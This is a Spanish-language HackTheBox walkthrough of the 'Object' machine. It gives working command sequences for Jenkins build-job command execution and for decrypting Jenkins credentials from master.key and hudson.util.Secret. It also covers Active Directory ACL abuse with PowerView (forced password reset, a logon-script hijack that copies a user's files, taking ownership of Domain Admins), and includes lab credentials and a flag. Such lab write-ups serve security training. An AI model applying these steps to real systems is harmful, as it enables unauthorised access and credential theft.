PING 10.10.11.132 (10.10.11.132) 56(84) bytes of data.
64 bytes from 10.10.11.132: icmp_seq=1 ttl=127 time=143 ms

--- 10.10.11.132 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.382/143.382/143.382/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.132 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 17:58 -05
Initiating SYN Stealth Scan at 17:58
Scanning 10.10.11.132 [65535 ports]
Discovered open port 80/tcp on 10.10.11.132
Discovered open port 8080/tcp on 10.10.11.132
Discovered open port 5985/tcp on 10.10.11.132
Completed SYN Stealth Scan at 17:58, 26.99s elapsed (65535 total ports)
Nmap scan report for 10.10.11.132
Host is up, received user-set (0.20s latency).
Scanned at 2023-10-26 17:58:21 -05 for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 127
5985/tcp open  wsman      syn-ack ttl 127
8080/tcp open  http-proxy syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 22 (968B)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,5985,8080 10.10.11.132 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 18:00 -05
Nmap scan report for 10.10.11.132
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Microsoft IIS httpd 10.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Jetty 9.4.43.v20210629&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que los puertos &lt;code&gt;80&lt;/code&gt; y &lt;code&gt;8080&lt;/code&gt; corresponde a un servicio web con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de enumerar las tecnolologias que emplean.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.11.132
http://10.10.11.132 [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]
❯ whatweb http://10.10.11.132:8080
http://10.10.11.132:8080 [403 Forbidden] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://10.10.11.132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que nos enfrentamos a un &lt;code&gt;IIS&lt;/code&gt; y en el puerto &lt;code&gt;8080&lt;/code&gt; a un &lt;code&gt;jenkyll&lt;/code&gt;, asi que vamos a proceder a abrirnos el servicio en nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos la opcion de crear cuenta, asi vamos a proceder a registrarnos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez creamos nuestra cuenta, nos redirigimos a un panel de usuario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro podemos crear un proyecto al cual llamare &lt;code&gt;test&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tendremos una serie de opciones como agregar un nombre.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en la parte de &lt;code&gt;build triggers&lt;/code&gt;, seleccionar que se ejecute periodicamente y configurar la ejecución cada minuto como si fuera una tarea cron.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues en &lt;code&gt;build&lt;/code&gt; seleccionar ejecutar comando de windows.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aqui agregaremos el comando que deseamos ejecutar, Aplicamos los cambios y guardamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pasado un minuto vemos en nuestro &lt;code&gt;build history&lt;/code&gt; vemos dos compilaciones.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seleccionamos cualquiera y en &lt;code&gt;console output&lt;/code&gt; vemos que se ejecuto el comando correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Otra forma mas comoda en la que podemos ejecutar comandos es a traves de la creación de un token, esto podemos hacerlo en la configuración de nuestro perfil.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en la configuración de nuestro proyecto debemos indicarle esta vez en lanzar ejecuciones remotas y ahora a esa &lt;code&gt;url&lt;/code&gt; generada debemos de tramitarle una petición con la autenticacion requerida, donde debemos indicarle nuestro usuario y el token.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta vez trataremos de ejecutar otro comando para listar el directorio actual.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lanzamos la petición con &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://fmiracle:1120abc86ec7661ac09d63349eb055baff@10.10.11.132:8080/job/test/build?token=myToken&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Recargamos la pagina y vemos que se genero otro build.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seleccionamos el nuevo build y vemos que el codigo se ejecuto correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora podriamos tratar de ganar acceso al sistema a traves de una conexión por &lt;code&gt;tcp o udp&lt;/code&gt; a nuestra maquina, pero si hacemos el mismo proceso y ejecutamos esta sentencia en &lt;code&gt;powershell&lt;/code&gt; podemos ver mediante las reglas de firewall que unicamente tenemos permitido el &lt;code&gt;icmp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vimos anteriormente que listando el directorio existia uno llamado &lt;code&gt;.jenkys&lt;/code&gt;, asi que vamos a listar los recursos dentro de este, esto lo logramos ejecutando los mismos pasos anteriores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos los directorios &lt;code&gt;users&lt;/code&gt; y &lt;code&gt;secrets&lt;/code&gt; y si lo listamos vemos los usuarios existentes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si listamos ahora lo que hay en &lt;code&gt;admin&lt;/code&gt;, encontramos un archivo &lt;code&gt;config.xml&lt;/code&gt;, que si lo leemos vemos la contraseña del usuario encryptada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta contraseña podemos tratar de desencriptarla, pero para ello vamos a necesitar los archivos del directorio &lt;code&gt;secrets&lt;/code&gt; los archivos &lt;code&gt;master.key&lt;/code&gt; y &lt;code&gt;hudson.util.secret&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Primero vamos a copiarnos el &lt;code&gt;master.key&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No olvidemos que hay quitar el salto de linea para que no de problemas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat master.key| tr -d '\n' | sponge master.key
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos copiaremos el &lt;code&gt;hudson&lt;/code&gt; pero debido a que este no es legible primero lo vamos a convertir a &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez que tenemos los 3 archivos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 config.xml   hudson.util.Secret   master.key
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a utilizar la herramienta del repositorio de &lt;code&gt;hoto&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/hoto/jenkins-credentials-decryptor&quot;&gt;jenkins-credentials-decryptor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Solo debes ejecutar este comando para tenerla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -L \
  &quot;https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)&quot; \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos con los parametros correspondientes, indicando cada archivo y obtenemos la contraseña en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ./jenkins-credentials-decryptor -c config.xml -m master.key -s hudson.util.Secret
[
  {
    &quot;id&quot;: &quot;320a60b9-1e5c-4399-8afe-44466c9cde9e&quot;,
    &quot;password&quot;: &quot;c1cdfun_d2434\u0003\u0003\u0003&quot;,
    &quot;username&quot;: &quot;oliver&quot;
  }
]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que el servicio de &lt;code&gt;winrm&lt;/code&gt; esta activo, podemos conectarnos usando estas credenciales al equipo y obtenemos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oliver\Documents&amp;gt; whoami
object\oliver
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/rt.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a utilizar &lt;code&gt;sharphound&lt;/code&gt; para enumerar el sistema y visualizar los resultados en &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Subimos el &lt;code&gt;sharphound&lt;/code&gt; al equipo importandolo directamente con &lt;code&gt;Iex&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; upload /home/fmiracle/machines/Oject/content/SharpHound.ps1
                                        
Info: Uploading /home/fmiracle/machines/Oject/content/SharpHound.ps1 to C:\Windows\Temp\Privesc\SharpHound.ps1
                                        
Data: 1297764 bytes of 1297764 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Import-Module .\SharpHound.ps1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos transferimos el comprimido y lo abrimos en &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; download C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip
                                        
Info: Downloading C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip to 20231026165356_BloodHound.zip
                                        
Info: Download successful!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que el usuario &lt;code&gt;oliver&lt;/code&gt; tenemos el permiso de &lt;code&gt;ForceChangedPassword&lt;/code&gt; sobre &lt;code&gt;smith&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vamos a la opción &lt;code&gt;abuse info&lt;/code&gt;, vemos una manera de poder aprovecharnos de este privilegio, para ello primero debemos generar una contraseña en formato &lt;code&gt;SecureString&lt;/code&gt; y ejecutar &lt;code&gt;Set-DomainUserPassword&lt;/code&gt; que es una función de &lt;code&gt;Powerview.ps1&lt;/code&gt; asi que primero debemos descargarnos el script e importarnos el modulo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Set-DomainUserPassword -Identity smith -AccountPassword $secPassword
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos y nos conectamos exitosamente como &lt;code&gt;smith&lt;/code&gt; con la credencial que definimos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que somo &lt;code&gt;smith&lt;/code&gt; vamos a marcarlo como &lt;code&gt;Owned&lt;/code&gt; y veamos con que permisos cuenta este nuevo usuario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que este nuevo usuario tiene el privilegio de &lt;code&gt;GenericWrite&lt;/code&gt; sobre &lt;code&gt;maria&lt;/code&gt;, y si vamos a &lt;code&gt;abuse info&lt;/code&gt; nos dice que podemos tratar de ejecutar un &lt;code&gt;kerberoasting attack&lt;/code&gt;, pero si lo tratamos de realizar no podremos crackear la contraseña debido a que la contraseña del usuario &lt;code&gt;maria&lt;/code&gt; es bastante robusta.&lt;/p&gt;

&lt;p&gt;Pero dado que con este privilegio podemos modificar los atributos de un usuario, vamos a tratar de aprovecharnos de este privilegio asignando un script de inicio de sesión al perfil de maria, de este modo cada vez que inicie sesión puedo hacer que ejecute un script que podemos definirnos.&lt;/p&gt;

&lt;p&gt;Pero para ello debemos de usar la función &lt;code&gt;Set-DomainObject&lt;/code&gt; que se encuentra en &lt;code&gt;PowerView.ps1&lt;/code&gt;, asi que vamos a volver a importarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Import-Module .\PowerView.ps1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Despues vamos a crear un script &lt;code&gt;test.ps1&lt;/code&gt; que copie todos los archivos del escritorio de &lt;code&gt;maria&lt;/code&gt; a mi ruta actual.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; echo &quot;copy C:\Users\Maria\Desktop\* C:\ProgramData\Privesc\&quot; &amp;gt; test.ps1
*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\Privesc\test.ps1'}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listamos los archivos y vemos un archivo &lt;code&gt;Engine.xsl&lt;/code&gt; que vamos a traernos a nuestro equipo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Abrimos el archivo con &lt;code&gt;libreoffice&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 20231026165356_BloodHound.zip   config.xml   credentials.txt   Engines.xls   hudson.util.Secret   jenkins-credentials-decryptor   master.key   PowerView.ps1   SharpHound.ps1
❯ libreoffice Engines.xls
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos las contraseña y obtenemos nuevas credenciales validas, &lt;code&gt;maria:W3llcr4ft3d_4cls&lt;/code&gt;, nos conectamos y ahora somos el usuario &lt;code&gt;maria&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents&amp;gt; whoami
object\maria
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora como maria vemos que tenemos el privilegio de &lt;code&gt;WriteOwner&lt;/code&gt; sobre &lt;code&gt;Domain Admins&lt;/code&gt; y ya con esto podriamos asignarnos el grupo &lt;code&gt;Domain Admins&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vemos el &lt;code&gt;abuse info&lt;/code&gt; nuevamente podemos ver que nos indica una forma en la que podemos hacerlo, para ello vamos a ejecutar lo siguiente, pero no sin antes volver a importar el &lt;code&gt;PowerView.ps1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Set-DomainObjectOwner -Identity &quot;Domain Admins&quot; -OwnerIdentity maria
*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Add-DomainObjectAcl -TargetIdentity &quot;Domain Admins&quot; -Rights All -PrincipalIdentity maria
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos los grupos del usuario &lt;code&gt;maria&lt;/code&gt; y ya se encuentra en &lt;code&gt;Domain Admins&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:32 PM
Password expires             Never
Password changeable          10/22/2021 9:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 C:\ProgramData\Privesc\test.ps1
User profile
Home directory
Last logon                   10/26/2023 2:25:15 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tendriamos que volver a conectarnos para actualizar los permisos, dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents&amp;gt; cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
923cbfd8245771bc2a485f96fb451072
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 26 Oct 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Object</link>
